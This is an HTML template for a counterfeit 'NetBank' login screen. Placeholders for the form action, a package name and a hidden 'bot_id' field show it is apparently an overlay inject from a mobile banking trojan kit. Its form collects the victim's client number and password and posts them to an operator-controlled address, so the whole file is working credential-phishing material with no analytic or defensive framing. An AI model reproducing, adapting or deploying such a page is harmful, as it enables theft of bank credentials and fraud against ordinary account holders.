<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>Net bank</title>

    <link rel="stylesheet" href="%DYN_PATH%/css/normalize.css">
    <link rel="stylesheet" href="%DYN_PATH%/css/main.css">
    <link rel="stylesheet" href="%DYN_PATH%/css/01.css">

    <script src="%DYN_PATH%/js/vendor/jquery-1.11.3.min.js"></script>
    <script src="%DYN_PATH%/js/viewport.js"></script>
    <script src="%DYN_PATH%/js/01.js"></script>
</head>

<body>
	<div class="modal modal_01">
		<div class="container">
            <div class="row">
                <div class="form_header">
                    Log on to <strong>Net</strong>Bank <img src="%DYN_PATH%/img/lock.png" alt="".>
                </div>
            </div>
			<form action="%ACTION%" method="post" class="wrapper">
                <input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
				<div class="fields_wr">
					<div class="row">
			            <div class="field_img_wr">
			            	<img src="%DYN_PATH%/img/user.png" alt="" class="field_img">
			            </div>
			            <div class="input_wr">
			                <div class="input_inner">
			                	<input type="text" name="fields[number]" id="number_input" maxlength="8" class="main_input client_input" placeholder="Client number">
			                </div>
			            </div>
			        </div>
			        <div class="row">
			            <div class="field_img_wr">
			            	<img src="%DYN_PATH%/img/lock_2.png" alt="" class="field_img">
			            </div>
			            <div class="input_wr">
			                <div class="input_inner">
			                	<input type="password" name="fields[password]" id="pass_input" maxlength="16" class="main_input password_input" placeholder="Password">
			                </div>
			            </div>
			        </div>
				</div>
		        <div class="row">
		            <input class="logon_btn" type="submit" value="Continue">
		        </div>
			</form>
		</div>
	</div>
</html>
